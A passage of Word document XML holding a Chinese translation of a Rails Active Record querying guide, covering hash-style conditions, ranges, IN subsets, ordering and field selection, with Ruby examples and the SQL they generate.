      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2B36EDC9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">这个查询会产生类似于如下的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="25ECF68A" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="754CFF59" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="2112236642"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"clients".* FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"clients"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>("clients"."created_at"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BETWEEN</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'2010-09-29'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>AND</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'2010-11-30')</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0EBAD3B1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 映射表式条件表达式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3057F2B0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Active Record 还支持传递一个映射表式条件表达式来提高你的条件表达式的可读性。在映射表式的条件表达式中，你把想比较的字段作为键，要用来比较的变量作为值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3906050F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>映射表式的条件表达式只用于相等比较，排序和子集查找中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36FCCFFD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.3.1 等价条件表达式</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3624"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="480BF35A" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1BC3F7F3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1737167045"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.where(:locked</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0D83A7E1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>字段名也可以是一个字符串：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3744"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="45A5775A" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0ECC1099" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1567178107"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.where('locked'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="77E09341" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.3.2 数列式条件表达式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D7E2377" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>这种写法的好处是我们可以直接传一串变量而不需要像本节开头一样生成一个大大的查询语句。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="4B0C2FE3" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B237A00" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="151682387"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.where(:created_at</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; (Time.now.midnight -1.day)..Time.now.midnight)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2D95E1DF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">它会用以下含有 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>BETWEEN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句来找出所有昨天创建的 client 记录：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="263E63A4" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A06E9A6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="469638779"/>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WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(clients.created_at BETWEEN</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'2008-12-21 00:00:00'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>AND</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'2008-12-22 00:00:00')</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4281585B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>这个表达式是数组式条件表达式中的那个范例的更简单的写法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7727635D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.3.3 子集条件表达式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D1BCB7D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你想使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>IN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 来查找记录，你可以传一个数组给映射表条件表达式：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4704"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="1B16E4A6" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E5A590B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="132215414"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.where(:orders_count</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; [1,3,5])</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="584E6C46" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">以上代码会产生类似于如下语句的的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 表达式。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7126"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="3CBB8258" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="539CAD91" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1618834877"/>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WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(clients.orders_count in</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(1,3,5)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="00844EAD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>3 排序</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECAFB1E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你想按照某种特定顺序返回检索的记录，可以使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>order</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C10978C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">比如：如果你有一组记录并且希望它们能够按照 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>created_at</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的升序排列：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3336"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="4FCC9C5B" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2392BF96" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1938978657"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.order("created_at")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7797381B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你还可以指定 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ASC</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DESC</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3936"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="63C54E23" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7F5056F8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.order("created_at DESC")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48256F57" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># 或者</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F2D3133" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.order("created_at ASC")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2353820A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>又或者是按照多个字段排序：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6336"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2D076E91" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="55B06DA2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.order("orders_count ASC, created_at DESC")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C6ABBF0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># 或者</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55B8C918" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.order("orders_count ASC", "created_at DESC")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="11298A25" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>4 选择返回的字段（投影）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01A55C47" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">默认情况下， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.find</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>select *</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 来返回结果记录的所有字段。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD1B110" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你要返回结果集的一个子集，那你可以通过 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法来指定这个子集。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A827F2A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你使用了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法，那返回的集合是"只读的":#10 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B555716" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03FA9EE5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">比如：我们只需要 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>viewable_by</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>locked</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 两个字段：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4536"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7B64D4A3" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="40AE57A3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1904750383"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.select("viewable_by, locked")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="663E7BE8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">最终生成的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 就会像下面一样：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
